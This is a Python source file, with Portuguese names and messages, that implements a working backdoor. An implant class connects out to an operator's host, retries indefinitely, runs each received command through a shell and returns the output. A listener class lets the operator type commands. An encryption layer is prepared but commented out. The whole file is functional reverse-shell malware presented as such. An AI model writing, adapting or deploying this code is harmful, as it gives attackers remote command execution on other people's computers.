from datetime import datetime
from subprocess import Popen, PIPE
from base64 import urlsafe_b64encode
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR


class BackDoorSRV:
    def __init__(self, host, port=5000):
        self.print(f"INICIANDO CONEXAO COM {host}:{port}")
        self.buffer = 1024
        self.encriptarMsg()
        self.host = host
        self.port = port
        self.run()

    def criarConexao(self):
        self.conexao = socket(AF_INET, SOCK_STREAM)
        self.conexao.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        #self.conexao.settimeout(20)

    def run(self):
        contagem = 0
        while True:
            try:
                self.criarConexao()
                print(f"TENTANDO CONECTAR({contagem})", end='\r')
                contagem += 1
                self.conexao.connect((self.host, self.port))
                contagem = 0
                self.receberConexao()
            except Exception as erro: self.conexao.close()

    def receberConexao(self):
        self.send(self.conexao, f"VOCÊ ESTA CONECTADO!\n")
        self.send(self.conexao, f"DIGITE SEU COMANDO E PRESSIONE [ENTER]\n")
        self.send(self.conexao, f"CMD({datetime.now()}) > ")
        while True:
            try: 
                try:
                    cmd = self.recv(self.conexao)
                    if('\n' != cmd): 
                        if('sair' in cmd): 
                            self.send(self.conexao, f"{datetime.now()} TCHAL...")
                            self.print(f"CLIENTE SAIU {self.host}... ")
                            self.conexao.close(); break 
                        self.cmds(cmd, self.conexao)
                        self.print(cmd)
                    self.send(self.conexao, f"CMD({datetime.now()}) > ")
                except Exception as erro: pass#self.fecharConexao(self.conexao, erro); break
            except Exception as erro: pass#self.fecharConexao(self.conexao, erro); break

    def fecharConexao(self, con, err):
        print(f"ERRO ENCONTRADO NA CONEXAO {con} ---> ({err})")
        print("FECHANDO A CONEXAO")
        try: con.close()
        except: pass

    def cmds(self, cmd, cliente):
        cmds = Popen(cmd.replace('\n', ''), shell=True, stdout=PIPE, stdin=PIPE).stdout.read()
        self.conexao.sendall(cmds)

    def print(self, msg, log=True):
        if(log): self.gravarLog(msg.replace('\n', ''))

    def encriptarMsg(self):
        salt = b'JESUS ESTA VOLTANDO EM BREVE' 
        kdf = PBKDF2HMAC( algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
        objKey = urlsafe_b64encode(kdf.derive(salt))
        self.objEncryptor = Fernet(objKey)

    def send(self, con, msg):
        #con.send(self.objEncryptor.encrypt(msg.encode('UTF-8')))
        con.send(msg.encode('UTF-8'))

    def recv(self, con):
        return con.recv(self.buffer)
        """
        msg = con.recv(self.buffer)
        try: return self.objEncryptor.decrypt(msg).decode()
        except: return msg
        """

    def gravarLog(self, msg):
        with open('log.log', 'a') as arq: arq.write(f'{datetime.now()} ---- ' + msg + '\n')

class BackDoorCli(BackDoorSRV):
    def __init__(self, port):
        self.print(f"ABRINDO CONEXAO PORTA: {port}")
        print("[!!!] PRONTO PARA OPERAR COMANDANTE!\n")
        self.port = port
        self.criarConexao()
        self.conexao.bind(('', port))
        self.conexao.listen(1)
        self.encriptarMsg()
        self.buffer = 1024
        self.run()

    def run(self): 
        while True:
            try:
                con, cli = self.conexao.accept()
                print(f"SERVIDOR CONECTADO {cli}")
                while True:
                    try:
                        print(self.recv(con))
                        cmd = input("DIGITE O COMANDO DO DOS E PRESSIONE [ENTER]>:")
                        self.send(con, cmd)
                    except  Exception as erro: self.fecharConexao(con, erro);break
            except Exception as erro: self.fecharConexao(con, erro)

#BackDoorSRV('127.0.0.1', 5000)
BackDoorCli(5000)